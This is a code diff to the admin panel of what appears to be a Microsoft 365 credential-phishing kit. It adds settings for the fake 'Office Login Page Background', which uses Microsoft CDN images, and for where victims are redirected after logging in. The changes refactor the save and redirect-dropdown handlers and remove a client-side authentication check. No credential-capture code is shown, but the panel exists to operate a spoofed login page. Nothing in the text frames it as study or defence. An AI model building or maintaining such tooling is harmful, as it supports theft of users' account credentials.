@@ -618,7 +618,7 @@
                 <div class="form-row">
                     <div class="form-group" style="flex: 2;">
                         <label class="form-label">Redirect Destination:</label>
-                        <select id="redirect-destination" class="form-input" onchange="handleRedirectChange()">
+                        <select id="redirect-destination" class="form-input">
                             <option value="https://office.com">Microsoft Office (Default)</option>
                             <option value="https://outlook.office.com/mail/">Outlook Mail</option>
                             <option value="https://www.microsoft.com">Microsoft Home</option>
@@ -831,13 +831,13 @@
                 <h2 class="section-title">Office Login Page Background</h2>
                 <div class="form-group">
                     <label class="form-label">Background Image URL:</label>
-                    <select id="background-url-select" class="form-input">
+                    <select id="background-url-select" class="form-input" onchange="updateBackgroundUrl()">
                         <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg">Default Office Background (Image)</option>
                         <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg">Alternative Office Background (SVG)</option>
                     </select>
                 </div>
                 <div style="margin-top: 12px;">
-                    <button onclick="saveBackgroundUrl()" class="btn btn-success">
+                    <button onclick="updateBackgroundUrl()" class="btn btn-success">
                         Save Background
                     </button>
                 </div>
@@ -2000,19 +2000,9 @@
             }
         }
 
-        async function saveBackgroundUrl() {
-            if (!isAuthenticated) {
-                alert('⚠️ AUTHENTICATION REQUIRED');
-                return;
-            }
-
+        async function updateBackgroundUrl() {
             const select = document.getElementById('background-url-select');
             const url = select.value;
-
-            if (!url) {
-                alert('Please select a background URL');
-                return;
-            }
 
             try {
                 const token = getStoredToken();
@@ -2025,28 +2015,12 @@
                 const data = await response.json();
                 if (data.success) {
                     alert('✅ Office login page background updated successfully!');
-                    loadBackgroundConfig(); // Reload to confirm
                 } else {
                     alert('⚠️ Failed to save background: ' + (data.error || 'Unknown error'));
                 }
             } catch (error) {
                 console.error('Error saving background URL:', error);
                 alert('❌ Network error while saving background');
-            }
-        }
-
-        // Redirect dropdown change handler
-        function handleRedirectChange() {
-            const select = document.getElementById('redirect-destination');
-            const customInput = document.getElementById('custom-redirect-url');
-            
-            if (select && customInput) {
-                if (select.value === 'custom') {
-                    customInput.style.display = 'block';
-                    customInput.focus();
-                } else {
-                    customInput.style.display = 'none';
-                }
             }
         }
 
@@ -2057,10 +2031,18 @@
                 loadRedirectConfig();
             }, 500);
 
-            // Set up redirect dropdown listener
             const select = document.getElementById('redirect-destination');
-            if (select) {
-                select.addEventListener('change', handleRedirectChange);
+            const customInput = document.getElementById('custom-redirect-url');
+
+            if (select && customInput) {
+                select.addEventListener('change', function() {
+                    if (this.value === 'custom') {
+                        customInput.style.display = 'block';
+                        customInput.focus();
+                    } else {
+                        customInput.style.display = 'none';
+                    }
+                });
             }
         });
 
